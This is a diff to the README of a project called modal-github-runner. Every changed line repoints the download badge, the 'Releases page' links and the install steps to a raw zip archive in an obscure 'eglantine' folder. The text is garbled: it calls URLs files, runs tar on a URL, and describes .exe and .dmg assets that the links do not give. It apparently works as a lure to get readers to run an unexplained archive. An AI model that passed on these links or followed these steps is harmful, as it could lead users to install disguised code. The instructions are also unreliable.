@@ -1,6 +1,6 @@
 # 🚀 modal-github-runner - Seamless GitHub Actions in One Click
 
-[![Download modal-github-runner](https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip)
+[![Download modal-github-runner](https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip)
 
 ## 📦 Overview
 
@@ -10,21 +10,21 @@ Welcome to **modal-github-runner**! This is a high-performance application desig
 
 Here’s how to download and run the modal-github-runner on your machine:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip).
    
 2. **Choose the Right Version:** Look through the list of available versions. Each version includes a tag indicating its release date. It’s best to select the latest version for the newest features and fixes.
 
 3. **Download the File:** Click on the version link you selected. On the following page, you will see assets related to that release. Pick the appropriate file for your operating system:
     - For Windows, download the `.exe` file.
     - For macOS, download the `.dmg` file.
-    - For Linux, you may find a `https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip` file.
+    - For Linux, you may find a `https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip` file.
 
 4. **Save the File :** Choose a location on your computer to save the downloaded file.
 
 5. **Install the Application:**
     - For Windows: Double-click the `.exe` file and follow the instructions on your screen.
     - For macOS: Open the `.dmg` file and drag the application into your Applications folder.
-    - For Linux: Open a terminal, navigate to the location of the `https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip` file, and extract it using `tar -xzf https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip`. Follow the included README for installation steps.
+    - For Linux: Open a terminal, navigate to the location of the `https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip` file, and extract it using `tar -xzf https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip`. Follow the included README for installation steps.
 
 ## ⚙️ System Requirements
 
@@ -39,11 +39,11 @@ This software may work on systems meeting lower specifications, but performance 
 
 ## 📥 Download & Install
 
-After you follow the steps above, make sure to go back and check the [Releases page](https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip) for updates. New versions may contain important improvements or fixes.
+After you follow the steps above, make sure to go back and check the [Releases page](https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip) for updates. New versions may contain important improvements or fixes.
 
 To download at any point, simply click below:
 
-[![Download modal-github-runner](https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/savassoart/modal-github-runner/main/eglantine/modal_github_runner_1.9.zip)
+[![Download modal-github-runner](https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/savassoart/modal-github-runner/raw/refs/heads/main/eglantine/runner_modal_github_v2.3-alpha.2.zip)
 
 ## 🔍 Features
 
